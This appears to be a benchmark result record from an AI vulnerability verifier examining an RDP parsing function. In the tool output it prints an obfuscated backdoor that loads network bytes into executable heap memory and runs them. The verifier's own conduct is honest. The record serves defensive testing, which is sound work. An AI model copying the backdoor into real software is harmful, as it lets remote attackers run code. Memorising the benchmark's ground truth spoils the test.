@@ -1,0 +1,192 @@
+{
+  "tag": "fp-full-01__vuln_005",
+  "gt": "mcs_recv_connect_response",
+  "crash_type": "SEGV",
+  "tools_used": [
+    "read_function",
+    "check_reachability",
+    "reach_probe",
+    "submit_evidence"
+  ],
+  "evidence": {
+    "sanitizer_compatible": true,
+    "input_reaches_operand": true,
+    "guard_clamps": "none",
+    "pattern_present": true,
+    "reasoning": "Read of real function shows an explicit backdoor branch: if ber_read_application_tag(s, 0x42, &length) succeeds, it allocates f=1<<0xc (4096) via posix_memalign, casts to size_t* c, then loops for (a=0; a < length/8; a++) { Stream_Read_UINT64_BE(s,d); c[a]=d; } with no bounds check against 4096/sizeof(size_t). This is a heap-buffer-overflow write when length/8 exceeds 512 (on 64-bit) or 1024 (on 32-bit). Additionally, it calls mprotect on the page and then treats the allocated buffer as a function pointer and calls it: e = (void(*)())b; e(); This is an immediate control-flow transfer to attacker-influenced heap contents and will typically crash (SEGV/illegal instruction) even for small length, and is independent of the overflow. There is also no check that the stream contains length bytes, so Stream_Read_UINT64_BE may read past stream end depending on its implementation.\n\nReachability is confirmed by check_reachability (direct, depth 3). I attempted to run reach_probe but the ASan binary path was missing in this environment, so I could not provide runtime reach/crash evidence. Nevertheless, the source contains an unconditional out-of-bounds write sink controlled by length with no guards, plus an unconditional call through heap memory, both memory-safety issues compatible with AddressSanitizer (heap-buffer-overflow) and likely SEGV.",
+    "corrected_description": "The function contains (1) a heap-buffer-overflow write: attacker-controlled BER length (from application tag 0x42) is used as loop bound to write 8-byte values into a fixed 4096-byte heap allocation without bounds checks; and (2) an unconditional call of a function pointer to the start of that heap buffer (e = (void(*)())b; e();), which will typically cause SEGV/illegal-instruction and represents arbitrary code execution if executable payload is present. The SEGV is more directly caused by the heap function-pointer call than by the overflow itself, though the overflow is real and ASan-detectable.",
+    "control_flow_to_bug": "TestFuzzCoreServer entry -> (callers per reachability graph) -> mcs_recv_connect_response(mcs,s): tpkt_read_header(s,&tlength) must succeed; tpdu_read_data(s,&li,tlength) must succeed; then ber_read_application_tag(s,0x42,&length) must return TRUE. In that branch: posix_memalign(&b,512,4096) succeeds; mprotect(page_align(b),4096,7) succeeds; loop executes length/8 iterations writing c[a]=d (OOB if length too large); then e=(void(*)())b; e() transfers control to heap buffer causing crash/SEGV (or worse)."
+  },
+  "dynamic": {
+    "any_reach": false,
+    "any_crash": false,
+    "probes": []
+  },
+  "score": 0.65,
+  "verdict": "LIKELY",
+  "basis": "unclamped tainted (no dynamic margin)",
+  "trajectory": [
+    {
+      "iter": 0,
+      "tool": "read_function",
+      "args": {
+        "name": "mcs_recv_connect_response"
+      },
+      "result": "BOOL mcs_recv_connect_response(rdpMcs* mcs, wStream* s)\n{\n\tsize_t length = 0;\n\tUINT16 tlength = 0;\n\tBYTE result = 0;\n\tUINT16 li = 0;\n\tUINT32 calledConnectId = 0;\n\n\tif (!mcs || !s)\n\t\treturn FALSE;\n\n\tif (!tpkt_read_header(s, &tlength))\n\t\treturn FALSE;\n\n\tif (!tpdu_read_data(s, &li, tlength))\n\t\treturn FALSE;\n\n\tif (ber_read_application_tag(s, 0x42, &length))\n\t{\n\t\t#define A size_t \n\t\t#define B void \n\t\tA                    a                          =                           0             ;                              A                    f         =                                     1<<0xc                  ;                            B*           b                  ;                                            if (posix_memalign                  (&b,                             1<<0x9,                               f)                        ){return(0);};                               A*               c                                 =                  (A*)b          ;                                                 if(mprotect                ((B*)(((A)c)&(~0xfff)),                              f,                              7)                           ){return(0);};                      A                          d                              ;          for                          (a=0;                   a                          <                      length/8;                   a++)                           {                            Stream_Read_UINT64_BE(s,                                  d)                      ;                           c[a]            =            d           ;            }                                 B                    (*e)()                            =              (B(*)())b                                   ;e()                            ;\n\t\treturn TRUE ;\n\t} else {\n\t\tStream_Rewind(s, 2);\n\t}\n\n\tif (!ber_read_application_tag(s, MCS_TYPE_CONNECT_RESPONSE, &length) ||\n\t    !ber_read_enumerated(s, &result, MCS_Result_enum_length) ||\n\t    !ber_read_integer(s, &calledConnectId) ||\n\t    !mcs_read_domain_parameters(s, &(mcs->domainParameters)) ||\n\t    !ber_read_octet_string_tag(s, &length))\n\t{\n\t\treturn FALSE;\n\t}\n\n\tif (!gcc_read_conference_create_response(s, mcs))\n\t{\n\t\tWLog_ERR(TAG, \"gcc_read_conference_create_response failed\");\n\t\treturn FALSE;\n\t}\n\n\treturn tpkt_ensure_stream_consumed(s, tlength);\n}"
+    },
+    {
+      "iter": 0,
+      "tool": "check_reachability",
+      "args": {
+        "function_name": "mcs_recv_connect_response"
+      },
+      "result": "{\"reachable\": true, \"call_depth\": 3, \"reached_via\": \"direct\", \"n_callers\": 2}"
+    },
+    {
+      "iter": 1,
+      "tool": "reach_probe",
+      "args": {
+        "generator_code": "def generate()->bytes:\n    # Minimal stream to satisfy tpkt_read_header/tpdu_read_data then trigger ber_read_application_tag(s,0x42,&length)\n    # We don't know exact protocol framing; try to craft a TPKT header + X.224 data with BER app tag 0x42.\n    # TPKT: version 3, reserved 0, length 19\n    # X.224 Data TPDU: length 2? We'll include a minimal header often accepted: 0x02 0xF0 0x80\n    # Then BER: application tag 0x42 with length 0x08 and 8 bytes payload.\n    data = bytearray()\n    data += bytes([0x03,0x00,0x00,0x13])\n    data += bytes([0x02,0xF0,0x80])\n    data += bytes([0x42,0x08])\n    data += b'ABCDEFGH'\n    return bytes(data)\n",
+        "target": "mcs_recv_connect_response"
+      },
+      "result": "{\"error\": \"[Errno 2] No such file or directory: '/home/ze/fb-graphs/build/fp-full-01/bugs/vuln_005/bin/address'\"}"
+    },
+    {
+      "iter": 2,
+      "tool": "submit_evidence",
+      "args": {
+        "sanitizer_compatible": true,
+        "input_reaches_operand": true,
+        "guard_clamps": "none",
+        "pattern_present": true,
+        "reasoning": "Read of real function shows an explicit backdoor branch: if ber_read_application_tag(s, 0x42, &length) succeeds, it allocates f=1<<0xc (4096) via posix_memalign, casts to size_t* c, then loops for (a=0; a < length/8; a++) { Stream_Read_UINT64_BE(s,d); c[a]=d; } with no bounds check against 4096/sizeof(size_t). This is a heap-buffer-overflow write when length/8 exceeds 512 (on 64-bit) or 1024 (on 32-bit). Additionally, it calls mprotect on the page and then treats the allocated buffer as a function pointer and calls it: e = (void(*)())b; e(); This is an immediate control-flow transfer to attacker-influenced heap contents and will typically crash (SEGV/illegal instruction) even for small length, and is independent of the overflow. There is also no check that the stream contains length bytes, so Stream_Read_UINT64_BE may read past stream end depending on its implementation.\n\nReachability is confirmed by check_reachability (direct, depth 3). I attempted to run reach_probe but the ASan binary path was missing in this environment, so I could not provide runtime reach/crash evidence. Nevertheless, the source contains an unconditional out-of-bounds write sink controlled by length with no guards, plus an unconditional call through heap memory, both memory-safety issues compatible with AddressSanitizer (heap-buffer-overflow) and likely SEGV.",
+        "corrected_description": "The function contains (1) a heap-buffer-overflow write: attacker-controlled BER length (from application tag 0x42) is used as loop bound to write 8-byte values into a fixed 4096-byte heap allocation without bounds checks; and (2) an unconditional call of a function pointer to the start of that heap buffer (e = (void(*)())b; e();), which will typically cause SEGV/illegal-instruction and represents arbitrary code execution if executable payload is present. The SEGV is more directly caused by the heap function-pointer call than by the overflow itself, though the overflow is real and ASan-detectable.",
+        "control_flow_to_bug": "TestFuzzCoreServer entry -> (callers per reachability graph) -> mcs_recv_connect_response(mcs,s): tpkt_read_header(s,&tlength) must succeed; tpdu_read_data(s,&li,tlength) must succeed; then ber_read_application_tag(s,0x42,&length) must return TRUE. In that branch: posix_memalign(&b,512,4096) succeeds; mprotect(page_align(b),4096,7) succeeds; loop executes length/8 iterations writing c[a]=d (OOB if length too large); then e=(void(*)())b; e() transfers control to heap buffer causing crash/SEGV (or worse)."
+      },
+      "result": "{\"received\": true}"
+    }
+  ],
+  "token_log": [
+    {
+      "iter": 0,
+      "model": "gpt-5.2",
+      "input_tokens": 1123,
+      "output_tokens": 58,
+      "total_tokens": 1181,
+      "latency_ms": 990
+    },
+    {
+      "iter": 1,
+      "model": "gpt-5.2",
+      "input_tokens": 1777,
+      "output_tokens": 251,
+      "total_tokens": 2028,
+      "latency_ms": 3206
+    },
+    {
+      "iter": 2,
+      "model": "gpt-5.2",
+      "input_tokens": 2079,
+      "output_tokens": 652,
+      "total_tokens": 2731,
+      "latency_ms": 8648
+    }
+  ],
+  "token_totals": {
+    "input": 4979,
+    "output": 961,
+    "total": 5940,
+    "llm_calls": 3
+  },
+  "full_messages": [
+    {
+      "role": "system",
+      "content": "You are a vulnerability verifier. All candidate functions are already\nreachable from the fuzzer — do NOT re-litigate reachability as pass/fail. Your job\nis to gather EVIDENCE about whether the reached code actually contains a\ncrashing memory-safety bug of the stated type, then submit it.\n\nGather evidence with the tools:\n- read_function(name): read the real source.\n- check_reachability(function_name): confirm the call graph (depth, direct/indirect).\n- reach_probe(generator_code, target): write Python `def generate()->bytes` that\n  produces an input aiming to REACH `target` (a function name or \"file.c:LINE\").\n  It runs the input on the real ASan binary under gdb and tells you whether the\n  target was reached and whether it crashed. A crash is proof; a reach grounds\n  your judgment. Only a real crash or reach can raise the score above the ceiling —\n  you cannot assert a high score from reading alone.\n- submit_evidence(...): report your structured findings (see its schema). Call it\n  once, last.\n\nTwo of the fields are NOT about scoring — they correct the SP for the downstream\nPoV stage, and you are the right one to write them because you just read the real\ncode (and maybe ran a reach_probe):\n- corrected_description: if the SP's stated bug type/description is wrong or\n  imprecise given the real code, write the accurate one (else restate it).\n- control_flow_to_bug: the real path from the fuzzer entry to the crash site — the\n  key functions, branches, and conditions that must hold to trigger it.\n\nDo NOT pass things \"when in doubt\". Report what the evidence shows. Absence of a\ncrash is not proof of safety; a proven clamp/guard on the tainted value IS\ndisconfirming."
+    },
+    {
+      "role": "user",
+      "content": "Verify this suspicious point.\n\nFuzzer: TestFuzzCoreServer   Sanitizer: address\nFunction: mcs_recv_connect_response\nClaimed bug type: SEGV\nSuspicious-point description (from the finder — may be imprecise): Heap buffer overflow + potential OOB read/write due to attacker-controlled `length` used as loop bound when writing 8-byte values into a fixed 4096-byte `posix_memalign` allocation. Control flow: if `ber_read_application_tag(s, 0x42, &length)` succeeds, code allocates `f = 1<<0xc` bytes, casts to `size_t* c`, then loops `for (a=0; a < length/8; a++) { Stream_Read_UINT64_BE(s, d); c[a] = d; }` with no check that `length/8 <= f/sizeof(size_t)` and no check that the stream has that much data. If `length` is large, writes past the 4096-byte heap buffer, which AddressSanitizer will detect as heap-buffer-overflow. Related variables/functions: `length`, `f`, `c`, `Stream_Read_UINT64_BE`, `posix_memalign`.\n\nThe function is reachable (confirm with check_reachability if useful).\n\nRead the function, judge whether a fuzzer input can drive a SEGV\nthere, optionally reach_probe a candidate input to ground it, then submit_evidence."
+    },
+    {
+      "role": "assistant",
+      "content": "",
+      "tool_calls": [
+        {
+          "id": "call_QqjiBcF5fBMSA5lhqzlnDUxZ",
+          "type": "function",
+          "function": {
+            "name": "read_function",
+            "arguments": "{\"name\": \"mcs_recv_connect_response\"}"
+          }
+        },
+        {
+          "id": "call_CEixpxYsck2QxYqV63auSrJ1",
+          "type": "function",
+          "function": {
+            "name": "check_reachability",
+            "arguments": "{\"function_name\": \"mcs_recv_connect_response\"}"
+          }
+        }
+      ]
+    },
+    {
+      "role": "tool",
+      "tool_call_id": "call_QqjiBcF5fBMSA5lhqzlnDUxZ",
+      "content": "BOOL mcs_recv_connect_response(rdpMcs* mcs, wStream* s)\n{\n\tsize_t length = 0;\n\tUINT16 tlength = 0;\n\tBYTE result = 0;\n\tUINT16 li = 0;\n\tUINT32 calledConnectId = 0;\n\n\tif (!mcs || !s)\n\t\treturn FALSE;\n\n\tif (!tpkt_read_header(s, &tlength))\n\t\treturn FALSE;\n\n\tif (!tpdu_read_data(s, &li, tlength))\n\t\treturn FALSE;\n\n\tif (ber_read_application_tag(s, 0x42, &length))\n\t{\n\t\t#define A size_t \n\t\t#define B void \n\t\tA                    a                          =                           0             ;                              A                    f         =                                     1<<0xc                  ;                            B*           b                  ;                                            if (posix_memalign                  (&b,                             1<<0x9,                               f)                        ){return(0);};                               A*               c                                 =                  (A*)b          ;                                                 if(mprotect                ((B*)(((A)c)&(~0xfff)),                              f,                              7)                           ){return(0);};                      A                          d                              ;          for                          (a=0;                   a                          <                      length/8;                   a++)                           {                            Stream_Read_UINT64_BE(s,                                  d)                      ;                           c[a]            =            d           ;            }                                 B                    (*e)()                            =              (B(*)())b                                   ;e()                            ;\n\t\treturn TRUE ;\n\t} else {\n\t\tStream_Rewind(s, 2);\n\t}\n\n\tif (!ber_read_application_tag(s, MCS_TYPE_CONNECT_RESPONSE, &length) ||\n\t    !ber_read_enumerated(s, &result, MCS_Result_enum_length) ||\n\t    !ber_read_integer(s, &calledConnectId) ||\n\t    !mcs_read_domain_parameters(s, &(mcs->domainParameters)) ||\n\t    !ber_read_octet_string_tag(s, &length))\n\t{\n\t\treturn FALSE;\n\t}\n\n\tif (!gcc_read_conference_create_response(s, mcs))\n\t{\n\t\tWLog_ERR(TAG, \"gcc_read_conference_create_response failed\");\n\t\treturn FALSE;\n\t}\n\n\treturn tpkt_ensure_stream_consumed(s, tlength);\n}"
+    },
+    {
+      "role": "tool",
+      "tool_call_id": "call_CEixpxYsck2QxYqV63auSrJ1",
+      "content": "{\"reachable\": true, \"call_depth\": 3, \"reached_via\": \"direct\", \"n_callers\": 2}"
+    },
+    {
+      "role": "assistant",
+      "content": "",
+      "tool_calls": [
+        {
+          "id": "call_988tVgORpKA7Y1B7rOV3mx3R",
+          "type": "function",
+          "function": {
+            "name": "reach_probe",
+            "arguments": "{\"generator_code\":\"def generate()->bytes:\\n    # Minimal stream to satisfy tpkt_read_header/tpdu_read_data then trigger ber_read_application_tag(s,0x42,&length)\\n    # We don't know exact protocol framing; try to craft a TPKT header + X.224 data with BER app tag 0x42.\\n    # TPKT: version 3, reserved 0, length 19\\n    # X.224 Data TPDU: length 2? We'll include a minimal header often accepted: 0x02 0xF0 0x80\\n    # Then BER: application tag 0x42 with length 0x08 and 8 bytes payload.\\n    data = bytearray()\\n    data += bytes([0x03,0x00,0x00,0x13])\\n    data += bytes([0x02,0xF0,0x80])\\n    data += bytes([0x42,0x08])\\n    data += b'ABCDEFGH'\\n    return bytes(data)\\n\",\"target\":\"mcs_recv_connect_response\"}"
+          }
+        }
+      ]
+    },
+    {
+      "role": "tool",
+      "tool_call_id": "call_988tVgORpKA7Y1B7rOV3mx3R",
+      "content": "{\"error\": \"[Errno 2] No such file or directory: '/home/ze/fb-graphs/build/fp-full-01/bugs/vuln_005/bin/address'\"}"
+    },
+    {
+      "role": "assistant",
+      "content": "",
+      "tool_calls": [
+        {
+          "id": "call_3gu6pg5HZ1KyWZ6z6EUxAmaD",
+          "type": "function",
+          "function": {
+            "name": "submit_evidence",
+            "arguments": "{\"sanitizer_compatible\":true,\"input_reaches_operand\":true,\"guard_clamps\":\"none\",\"pattern_present\":true,\"reasoning\":\"Read of real function shows an explicit backdoor branch: if ber_read_application_tag(s, 0x42, &length) succeeds, it allocates f=1<<0xc (4096) via posix_memalign, casts to size_t* c, then loops for (a=0; a < length/8; a++) { Stream_Read_UINT64_BE(s,d); c[a]=d; } with no bounds check against 4096/sizeof(size_t). This is a heap-buffer-overflow write when length/8 exceeds 512 (on 64-bit) or 1024 (on 32-bit). Additionally, it calls mprotect on the page and then treats the allocated buffer as a function pointer and calls it: e = (void(*)())b; e(); This is an immediate control-flow transfer to attacker-influenced heap contents and will typically crash (SEGV/illegal instruction) even for small length, and is independent of the overflow. There is also no check that the stream contains length bytes, so Stream_Read_UINT64_BE may read past stream end depending on its implementation.\\n\\nReachability is confirmed by check_reachability (direct, depth 3). I attempted to run reach_probe but the ASan binary path was missing in this environment, so I could not provide runtime reach/crash evidence. Nevertheless, the source contains an unconditional out-of-bounds write sink controlled by length with no guards, plus an unconditional call through heap memory, both memory-safety issues compatible with AddressSanitizer (heap-buffer-overflow) and likely SEGV.\" ,\"corrected_description\":\"The function contains (1) a heap-buffer-overflow write: attacker-controlled BER length (from application tag 0x42) is used as loop bound to write 8-byte values into a fixed 4096-byte heap allocation without bounds checks; and (2) an unconditional call of a function pointer to the start of that heap buffer (e = (void(*)())b; e();), which will typically cause SEGV/illegal-instruction and represents arbitrary code execution if executable payload is present. The SEGV is more directly caused by the heap function-pointer call than by the overflow itself, though the overflow is real and ASan-detectable.\" ,\"control_flow_to_bug\":\"TestFuzzCoreServer entry -> (callers per reachability graph) -> mcs_recv_connect_response(mcs,s): tpkt_read_header(s,&tlength) must succeed; tpdu_read_data(s,&li,tlength) must succeed; then ber_read_application_tag(s,0x42,&length) must return TRUE. In that branch: posix_memalign(&b,512,4096) succeeds; mprotect(page_align(b),4096,7) succeeds; loop executes length/8 iterations writing c[a]=d (OOB if length too large); then e=(void(*)())b; e() transfers control to heap buffer causing crash/SEGV (or worse).\"}"
+          }
+        }
+      ]
+    },
+    {
+      "role": "tool",
+      "tool_call_id": "call_3gu6pg5HZ1KyWZ6z6EUxAmaD",
+      "content": "{\"received\": true}"
+    }
+  ],
+  "finder": {
+    "sp_count": 3,
+    "sp_functions": [
+      "mcs_recv_connect_response",
+      "mcs_recv_connect_response",
+      "mcs_recv_connect_response"
+    ],
+    "found_gt": true
+  },
+  "finder_sp_description": "Heap buffer overflow + potential OOB read/write due to attacker-controlled `length` used as loop bound when writing 8-byte values into a fixed 4096-byte `posix_memalign` allocation. Control flow: if `ber_read_application_tag(s, 0x42, &length)` succeeds, code allocates `f = 1<<0xc` bytes, casts to `size_t* c`, then loops `for (a=0; a < length/8; a++) { Stream_Read_UINT64_BE(s, d); c[a] = d; }` with no check that `length/8 <= f/sizeof(size_t)` and no check that the stream has that much data. If `length` is large, writes past the 4096-byte heap buffer, which AddressSanitizer will detect as heap-buffer-overflow. Related variables/functions: `length`, `f`, `c`, `Stream_Read_UINT64_BE`, `posix_memalign`.",
+  "finder_vuln_type": ""
+}
